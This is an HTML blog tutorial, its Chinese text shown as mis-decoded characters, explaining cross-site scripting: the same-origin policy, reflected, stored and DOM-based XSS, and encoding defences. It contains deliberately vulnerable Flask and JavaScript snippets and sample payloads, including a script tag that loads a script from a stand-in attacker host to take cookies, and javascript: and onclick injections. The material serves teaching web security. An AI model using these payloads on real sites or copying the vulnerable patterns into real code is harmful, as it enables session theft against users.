<html>
    <head>

        <meta http-equiv="content-type" content="text/html; charset=utf-8" />
        <link href=/static/css/main.css rel="stylesheet" type="text/css">
        <!--link href=/static/css/github.css
            rel="stylesheet" type="text/css" /-->
        <link rel="stylesheet" href="/pygments.css">
        <title>è·¨ç«™è„šæœ¬æ”»å‡»XSS</title>
    </head>
    <body>
        <h1>è·¨ç«™è„šæœ¬æ”»å‡»XSS</h1>

<p>è·¨ç«™è„šæœ¬æ”»å‡»(Cross Site Scripting), ç®€ç§°XSS(é¿å…å’ŒCSSå¼„æ··), æ˜¯é€šè¿‡æ³¨å…¥æ¶æ„JSä»£ç çš„æ–¹å¼è¿›è¡Œhack(ä¸šç•Œç§°ä¸º"æŒ‚é©¬"). è¢«OWASPè¯„ä¸ºWebå®‰å…¨çš„æœ€å¤§å¨èƒ.</p>

<h2>æµè§ˆå™¨çš„åŒæºç­–ç•¥</h2>

<p>æµè§ˆå™¨å®‰å…¨çš„åŸºç¡€æ˜¯åŒæºç­–ç•¥(same-origin policy). ç®€å•è¯´, åŒæºç­–ç•¥ä¿è¯æŸä¸ªç½‘ç«™çš„cookie(æ¯”å¦‚é“¶è¡Œçš„login cookie)ä¸è¢«åˆ«çš„ä¸åŒæºç½‘ç«™è¯»å–(æ¯”å¦‚æ¶æ„ç½‘ç«™ğŸ˜). <br/>
åŒæºçš„ç½‘ç«™æŒ‡è¿™"3åŒ":</p>

<ul>
<li>åŒåè®®</li>
<li>åŒåŸŸå(åŸŸåçº§åˆ«ä¹Ÿè¦ç›¸åŒ)</li>
<li>åŒç«¯å£</li>
</ul>

<p>å¦‚æœè®¾ç½®äº†<strong>document.domain</strong>, é‚£ä¹ˆåŸŸåçº§åˆ«ä¸åŒä¹Ÿç®—åŒæº. <br/>
åŒæºç­–ç•¥é™¤äº†å½±å“<strong>cookie</strong>çš„è¯»å†™, è¿˜å½±å“<strong>localStorage</strong>ã€<strong>indexDB</strong>çš„è¯»å†™, <strong>iframe</strong>çˆ¶çª—å£å’Œå­çª—å£é—´é€šä¿¡, é€šè¿‡<strong>ajax</strong>å‘é€httpè¯·æ±‚. <br/>
æ›´å¤šå…³äºåŒæºä»¥åŠè§„é¿åŒæºç­–ç•¥çš„æ–¹æ³•å‚è€ƒ: <a href="http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html">é˜®ä¸€å³°:æµè§ˆå™¨åŒæºæ”¿ç­–åŠå…¶è§„é¿æ–¹æ³•</a> <br/>
è™½ç„¶åŒæºç­–ç•¥å¤§å¤§å¢åŠ äº†è·¨ç«™æ”»å‡»çš„éš¾åº¦, ä½†æ˜¯ç¨‹åºæ˜¯äººå†™çš„, å¯èƒ½æœ‰å‡ºé”™çš„åœ°æ–¹, è¿™äº›åœ°æ–¹å°±æ˜¯XSSæ”»å‡»çš„çˆ†ç ´ç‚¹!</p>

<h2>XSSçš„å±å®³</h2>

<p>XSSæ³¨å…¥çš„æ¶æ„è„šæœ¬å«<strong>XSS Payload</strong>, XSS Payloadä¸€èˆ¬æ˜¯JSè„šæœ¬ä»¥åŠå…¶ä»–æµè§ˆå™¨æ’ä»¶è„šæœ¬(æ¯”å¦‚Flash:actionscript). JSè„šæœ¬å¯ä»¥è·å–cookie, æ¨¡æ‹Ÿç™»å½•, æ¨¡æ‹Ÿhttpè¯·æ±‚, ä¿®æ”¹ç½‘é¡µ... è¿™äº›éƒ½å¯ä»¥è¢«XSSåˆ©ç”¨, XSSçš„å±é™©æ€§å¯è§ä¸€æ–‘!</p>

<h2>XSSæ”»å‡»åˆ†ç±»</h2>

<p>æ ¹æ®è§¦å‘æ¶æ„ä»£ç æ³¨å…¥çš„åœºæ™¯, XSSæ”»å‡»å¯ä»¥åˆ†ä¸ºä»¥ä¸‹3ç±»:</p>

<ul>
<li>åå°„å‹XSS</li>
<li>å­˜å‚¨å‹XSS</li>
<li>Dom-Based XSS</li>
</ul>

<p>åå°„å‹XSSéœ€è¦ä¾é ç”¨æˆ·ç‚¹å‡»æŸä¸ªé“¾æ¥è§¦å‘XSSä»£ç æ³¨å…¥. <br/>
æ¯”å¦‚<code>www.bank.com/123/?name=neo1218</code>ä¸­æœ‰è¿™æ ·ä¸€æ®µä»£ç :</p>

<div class="codehilite"><pre><span></span><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">username</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mi">1</span><span class="p">).</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">];</span>
    <span class="kd">var</span> <span class="nx">html</span> <span class="o">=</span> <span class="s2">&quot;&lt;div&gt;username: &quot;</span> <span class="o">+</span> <span class="nx">username</span> <span class="o">+</span> <span class="s2">&quot;&lt;/div&gt;&quot;</span><span class="p">;</span>
    <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">html</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</pre></div>

<p>ä»æŸ¥è¯¢å‚æ•°è·å–å¹¶æ˜¾ç¤ºusername. è¿™é‡Œçš„æŸ¥è¯¢å‚æ•°å°±å¯ä»¥ä½œä¸ºä¸€ä¸ªXSSæ³¨å…¥ç‚¹:</p>

<div class="codehilite"><pre><span></span>www.bank.com/123/?name=<span class="nt">&lt;script</span> <span class="na">src=</span><span class="s">http://www.hack.com/xss.js</span><span class="nt">&gt;&lt;/script&gt;</span>
</pre></div>

<p>ç‚¹å‡»è¯¥é“¾æ¥å°±å¯ä»¥åŠ è½½xss.js, å¹¶è·å–ç”¨æˆ·cookie:<code>document.cookie</code>
<img alt="screen shot 2017-04-17 at 17 14 59" src="https://cloud.githubusercontent.com/assets/10671733/25084869/97d8c9f0-2391-11e7-92ed-d017afe5800f.png" />
<br/>
å­˜å‚¨å‹XSSæ›´å¼ºå¤§å’ŒæŒä¹…, åˆ©ç”¨ä¸€äº›äº¤äº’ä¸Šä¼ åœºæ™¯(ä¸Šä¼ åšå®¢ã€ä¸Šä¼ æ–‡ä»¶), hackerå¯ä»¥æŠŠXSSè„šæœ¬ä¸Šä¼ åˆ°æœåŠ¡å™¨ä¸Š, è¿›è€Œæ¯ä¸ªç”¨æˆ·è®¿é—®è¯¥ç½‘ç«™å°±ä¼šåŠ è½½æ¶æ„è„šæœ¬. è¿™äº›åœ°æ–¹é€šå¸¸ä¹Ÿå¯ä»¥è¿›è¡Œsqlæ³¨å…¥æ”»å‡».
<br/>
Dom-Based XSSå…¶å®ä¹Ÿæ˜¯åå°„å‹XSSçš„ä¸€ç§, æ¶æ„ä»£ç å¯ä»¥é€šè¿‡ä¿®æ”¹DOMèŠ‚ç‚¹è¢«æ³¨å…¥(æ¯”å¦‚innerHTML).</p>

<h2>XSSæ”»å‡»åŠé˜²å¾¡</h2>

<ul>
<li><strong>æ”»å‡»</strong>: æ§åˆ¶URLä¿®æ”¹HTML</li>
<li><strong>é˜²å¾¡</strong>: URLEncode</li>
</ul>

<p>å‡è®¾å­˜åœ¨æ¼æ´ç½‘ç«™å…è®¸ç”¨æˆ·ä¿®æ”¹HTMLå†…å®¹, æ¯”å¦‚:</p>

<div class="codehilite"><pre><span></span><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/user/&lt;username&gt;/&#39;</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">user</span><span class="p">(</span><span class="n">username</span><span class="p">):</span>
    <span class="k">return</span> <span class="s2">&quot;&lt;div&gt;username: </span><span class="si">%s</span><span class="s2">&lt;/div&gt;&quot;</span> <span class="o">%</span> <span class="n">username</span>
</pre></div>

<p>æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„é“¾æ¥:</p>

<div class="codehilite"><pre><span></span>http://localhost:5000/user/<span class="nt">&lt;script&gt;</span>alert(hack xss)<span class="nt">&lt;/script&gt;</span>/
</pre></div>

<p><br/>
ä½¿ç”¨<strong>URLEncode</strong>å¯ä»¥å°†å­—ç¬¦è½¬åŒ–æˆ<strong>%HH</strong>çš„å½¢å¼, æ¯”å¦‚' 'è½¬åŒ–æˆ%20ã€'"'è½¬åŒ–æˆ%22. è¿™æ ·æ¶æ„URLå°±å˜æˆäº†:</p>

<div class="codehilite"><pre><span></span>http://localhost:5000/user/%3Cscript%3Ealert(hack%20xss)%3C/script%3E/
</pre></div>

<p><br/>
ä½†æ˜¯å¦‚æœç”¨æˆ·å¯ä»¥å®Œå…¨æ§åˆ¶URL, è€ƒè™‘åˆ°URLè¯­ä¹‰çš„å®Œæ•´æ€§, ç»„æˆURLçš„Protocalã€Hostæ˜¯ä¸ä¼šè¢«è½¬ä¹‰çš„. æ‰€ä»¥å…¥ä¾µè€…å¯ä»¥æ„é€ åè®®è¿›è¡Œæ”»å‡», æ¯”å¦‚:</p>

<div class="codehilite"><pre><span></span><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/user/&lt;username&gt;/&#39;</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">user</span><span class="p">(</span><span class="n">username</span><span class="p">):</span>
    <span class="n">blog</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;blog&#39;</span><span class="p">)</span>
    <span class="k">return</span> <span class="s2">&quot;&lt;div&gt;username: </span><span class="si">%s</span><span class="s2">, &lt;a href=</span><span class="si">%s</span><span class="s2"> &gt;blog&lt;/a&gt;&lt;/div&gt;&quot;</span> \
            <span class="o">%</span> <span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">blog</span><span class="p">)</span>
</pre></div>

<p>å¯ä»¥æ„é€ æ¶æ„URL:</p>

<div class="codehilite"><pre><span></span>http://127.0.0.1:5000/user/neo1218/?blog=javascript:alert(1)
</pre></div>

<p><img alt="screen shot 2017-04-18 at 16 35 35" src="https://cloud.githubusercontent.com/assets/10671733/25121789/73674438-2455-11e7-8fac-1f40e8fb86af.png" />
<br/>
å¯¹äºè¿™ç§æƒ…å†µ, éœ€è¦å¯¹ç”¨æˆ·è¾“å…¥çš„URLåè®®è¿›è¡Œæ£€æŸ¥, è®¾ç½®åè®®ç™½åå•, å¯¹äºBlog URLåº”è¯¥åªå…è®¸http/https.
<hr/></p>

<ul>
<li><strong>æ”»å‡»</strong>: é€šè¿‡è¡¨å•ä¿®æ”¹HTML</li>
<li><strong>é˜²å¾¡</strong>: JSEncode, HTMLEncode</li>
</ul>

<p>å‡è®¾å­˜åœ¨æ¼æ´ç½‘ç«™å…è®¸ç”¨æˆ·é€šè¿‡è¡¨å•ä¿®æ”¹HTML, è¿™éœ€è¦åˆ†æƒ…å†µè€ƒè™‘, å¦‚æœä¿®æ”¹çš„æ˜¯HTMLæ ‡ç­¾ä¸­çš„å†…å®¹é‚£ä¹ˆè¿›è¡ŒHTMLEncode,é˜²æ­¢æ’å…¥<code>&lt;script&gt;</code>æ ‡ç­¾;
å¦‚æœä¿®æ”¹çš„æ˜¯HTMLå±æ€§æ¯”å¦‚<code>&lt;img src=ç”¨æˆ·è¾“å…¥&gt;, &lt;a href=ç”¨æˆ·è¾“å…¥&gt;</code>, é‚£ä¹ˆéœ€è¦å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡ŒJSEncode, é˜²æ­¢æ’å…¥onclickã€onerrorç­‰äº‹ä»¶.</p>

<hr/>

<ul>
<li><strong>æ”»å‡»</strong>: ä¿®æ”¹DOMèŠ‚ç‚¹</li>
<li><strong>é˜²å¾¡</strong>: JSEncodeã€HTMLEncode</li>
</ul>

<p>å‡è®¾å­˜åœ¨æ¼æ´ç½‘ç«™:</p>

<div class="codehilite"><pre><span></span><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="kd">function</span> <span class="nx">editdom</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">text</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;text&#39;</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
    <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;t&#39;</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="o">\</span>
        <span class="s2">&quot;&lt;a href=&#39;&quot;</span> <span class="o">+</span> <span class="nx">text</span> <span class="o">+</span> <span class="s2">&quot;&#39; &gt;link&lt;/a&gt;&quot;</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#39;t&#39;</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;&quot;</span> <span class="p">/&gt;</span>
<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;button&quot;</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;s&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;submit&quot;</span> <span class="na">onclick</span><span class="o">=</span><span class="s">&quot;editdom()&quot;</span> <span class="p">/&gt;</span>
</pre></div>

<p>æ”»å‡»è€…å¯ä»¥åœ¨textè¾“å…¥æ¡†ä¸­æ„é€ æ¶æ„è¾“å…¥</p>

<div class="codehilite"><pre><span></span>&#39; onclick=alert(/xss/) &gt;//
ç¬¬ä¸€ä¸ª&#39;ç”¨äºé—­åˆhref, &gt;//ç”¨äºé—­åˆåŠæ³¨é‡Šåé¢çš„ä»£ç 
</pre></div>

<p><img alt="screen shot 2017-04-18 at 17 06 32" src="https://cloud.githubusercontent.com/assets/10671733/25122965/67ec0806-2459-11e7-96fd-a6adf25dbfb3.png" />
<br/>
è€ƒè™‘åˆ°ä¿®æ”¹DOMæ—¶æµè§ˆå™¨é‡æ–°æ¸²æŸ“äº†é¡µé¢, é˜²å¾¡DOM-Based XSSçš„æ–¹æ³•æ˜¯é¦–å…ˆè¿›è¡ŒJSEncodeä¿æŠ¤<code>&lt;script&gt;&lt;/script&gt;</code>, ç„¶ådocument.writeæ—¶å¦‚æœè¾“å‡ºåˆ°HTMLåˆ™è¿›è¡ŒHTMLEncode, å¦‚æœè¾“å‡ºåˆ°JSäº‹ä»¶æˆ–è„šæœ¬åˆ™å†è¿›è¡Œä¸€æ¬¡JSEncode.
<hr/></p>

<ul>
<li><strong>æ”»å‡»</strong>: ä¿®æ”¹CSS </li>
<li><strong>é˜²å¾¡</strong>: CSSEncode</li>
</ul>

<p>æœ‰äº›ç½‘ç«™å…è®¸ç”¨æˆ·è¿›è¡Œè‡ªå®šä¹‰, å¯¹CSSè¿›è¡Œä¿®æ”¹, è¿™ä¹Ÿä¼šå¯¼è‡´XSS Payloadæ³¨å…¥. æ¯”å¦‚:</p>

<div class="codehilite"><pre><span></span><span class="p">&lt;</span><span class="nt">div</span> <span class="na">style</span><span class="o">=</span><span class="s">&quot;background-image: url(ç”¨æˆ·æ§åˆ¶)&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</pre></div>

<p>æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„å›¾ç‰‡URL: <code>javascript:alert(/xss/)</code>è¿›è¡Œhack. <br/>
é˜²å¾¡æ–¹æ³•å°±æ˜¯å¯¹ç”¨æˆ·è¾“å…¥åšCSSEncode, å°†é™¤å­—æ¯ã€æ•°å­—å¤–çš„æ‰€æœ‰å­—ç¬¦ç¼–ç æˆ16è¿›åˆ¶å½¢å¼.</p>

<h2>XSSè •è™«</h2>

<p>è¯´åˆ°XSSè •è™«å°±å¿…é¡»æåˆ°webå®‰å…¨å²ä¸Šç¬¬ä¸€ä¸ªå¤§è§„æ¨¡è •è™«ç—…æ¯’<strong>samy warm</strong>:</p>

<ul>
<li><a href="https://www.youtube.com/watch?v=DtnuaHl378M">samy warmä»‹ç»è§†é¢‘</a></li>
<li><a href="https://samy.pl/popular/tech.html">samy warmæŠ€æœ¯åˆ†æ</a></li>
<li><a href="https://www.youtube.com/watch?v=kJyGZDXCbmA">samy æœ¬äººæ¼”è®²</a></li>
</ul>

<h2>Thanks</h2>

<ul>
<li>ã€Šç™½å¸½å­è®²Webå®‰å…¨ã€‹æ˜¯æœ¬å¥½ä¹¦</li>
<li>ã€Šé»‘å®¢å†›å›¢ç¬¬äºŒå­£ã€‹æˆ‘å·²ç»çœ‹ä¸æ˜ç™½äº†</li>
</ul>
        <div id="disqus_thread"></div>
        <script>
        /**
        * RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
        * LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
        */
        /*
        var disqus_config = function () {
        this.page.url = PAGE_URL; // Replace PAGE_URL with your page's canonical URL variable
        this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
        };
        */
        (function() { // DON'T EDIT BELOW THIS LINE
        var d = document, s = d.createElement('script');

        s.src = '//neo1218flask.disqus.com/embed.js';

        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
        })();
        </script>
        <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
    </body>
</html>
